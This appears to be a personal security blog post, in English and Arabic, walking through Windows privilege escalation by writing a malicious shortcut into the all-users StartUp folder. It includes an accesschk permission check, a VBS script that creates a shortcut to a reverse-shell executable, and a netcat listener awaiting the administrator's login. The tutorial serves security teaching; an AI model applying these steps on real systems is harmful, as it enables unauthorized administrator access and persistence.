@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Privilege Escalation - StartUp Programs | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">windows-privesc</a><span class="sep">/</span><span>Privilege Escalation - StartUp Programs</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">windows-privesc</span>
+<span class="post-date">2023-07-10</span>
+</div>
+<h1 class="post-title">Privilege Escalation - StartUp Programs</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will cover how to escalate privileges on a Windows system by abusing the StartUp Programs folder.</p>
+<p>First, let us understand what startup programs are. Windows has a special folder that contains shortcuts to programs that must run whenever any user logs into the system. If we have write access to this folder, we can place a shortcut pointing to our malicious payload inside it. When an administrator logs into the system, our malicious file will execute automatically with the administrator's privileges, giving us an elevated session.</p>
+<p>The startup folder path is:</p>
+<pre><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+</code></pre>
+<h2>Walkthrough</h2>
+<h3>Step 1: Initial Access</h3>
+<p>As usual, we start with a limited-privilege user account on the target system (the <code>user</code> account).</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/1.jpeg" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Checking Write Permissions on the StartUp Folder</h3>
+<p>The first thing we need to verify is whether we have write access to the startup folder. We use the <code>accesschk</code> tool to check the permissions on the folder:</p>
+<pre><code>accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;
+</code></pre>
+<p>If the output shows that our current user or the <code>BUILTIN\Users</code> group has write access, we can proceed with the attack.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/2.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Creating a Malicious Shortcut with a VBS Script</h3>
+<p>Next, we use a simple VBS script to create a shortcut (<code>.lnk</code> file) pointing to our malicious executable. The script looks like this:</p>
+<pre><code class="language-vbs">Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)
+sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = &quot;C:\Users\user\Desktop\reverse.exe&quot;
+oLink.Save
+</code></pre>
+<p>Replace the <code>oLink.TargetPath</code> value with the actual path to your malicious payload on the target system.</p>
+<p>Save this script as <code>CreateShortcut.vbs</code>, then execute it with the following command:</p>
+<pre><code>cscript CreateShortcut.vbs
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/3.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 4: Verifying the Shortcut Was Created</h3>
+<p>Navigate to the startup folder path to confirm that the shortcut to our malicious file was successfully created:</p>
+<pre><code>dir &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;
+</code></pre>
+<p>We can see that the shortcut now exists in the startup folder, pointing to our reverse shell executable.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/4.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 5: Setting Up a Listener and Waiting for Admin Login</h3>
+<p>Now we set up a listener on our attacker machine on the port configured in our malicious payload, using netcat:</p>
+<pre><code>nc -lvnp &lt;port&gt;
+</code></pre>
+<p>When the administrator logs into the system, Windows automatically executes all shortcuts in the startup folder. Our malicious shortcut runs with the administrator's privileges, and a reverse shell connection is sent back to our listener.</p>
+
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/5.png" alt="Step 5" loading="lazy"></figure>
+<h3>Result</h3>
+<p>We have successfully obtained the highest privilege level on the system by abusing the Windows StartUp Programs folder. The key requirement for this technique is having write access to the startup directory, which allows us to plant a persistent payload that executes under any user who logs in -- including administrators.</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/6.png" alt="Step 6" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح اشرح لكم عن كيف نرفع صلاحيتنا عن طريق StartUp Programs</p>
+<p>خلوني اول شي افهمكم عن ال startup programs في مجلد على الوندوز يتضمن اختصار للبرامج اللي لازم تشتغل مع اي مستخدم يسجل دخول على النظام</p>
+<p>هذا المجلد اذا كان لنا صلاحية الكتابة عليه راح نسوي shortcut او اختصار للملف الخبيث حقنا واذا الادمن سجل دخول راح يشتغل الملف الخبيث حقنا و توصلنا جلسة بصلاحيته</p>
+<p>هذا هو مسار المجلد:</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/1.jpeg" alt="Step 1" loading="lazy"></figure>
+
+<p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p>
+<p>خلونا نبدا في الشرح وراح يوضح معكم كل شي</p>
+<p>الشرح:</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/2.png" alt="Step 2" loading="lazy"></figure>
+
+<p>طيب اول شي انا داخل بيوزر محدود الصلاحية كالعادة اللي هو user</p>
+<p>اول شي راح اشوف هل عندي صلاحية كتابة على المجلد او لا عن طريق اداة accesschk عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/3.png" alt="Step 3" loading="lazy"></figure>
+
+<p>اللحين راح استخدم سكربت بسيط بلغة vbs راح تنشأ لي اختصار او shortcut للملف الخبيث حقنا وهذا هو الكود</p>
+<p>راح تعوض فقط ف oLink.TargetPath بمسار الملف الخبيث حقك طيب بعد كذا نشغل السكربت عن طريق هذا الامر</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/4.png" alt="Step 4" loading="lazy"></figure>
+
+<p>cscript CreateShortcut.vbs</p>
+<p>الان لو نشوف المسار حق ال start up نشوف انشأ لنا اختصار للملف الخبيث حقنا اول لا</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/5.png" alt="Step 5" loading="lazy"></figure>
+
+<p>نلاحظ انه فعلا انشأ لنا اختصار للملف الخبيث حقنا اللحين فقط راح اتنصت على البورت الخاص بالملف الخبيث حقنا</p>
+<p>وراح اسجل دخول لحساب الادمن عشان يكمل السيناريو :)</p>
+<p>وبكذا حصلنا على اعلى صلاحية في النظام عن طريق StartUp Programs</p>
+<figure class="article-img"><img src="../assets/images/privilege-escalation-startup-programs/6.png" alt="Step 6" loading="lazy"></figure>
+
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
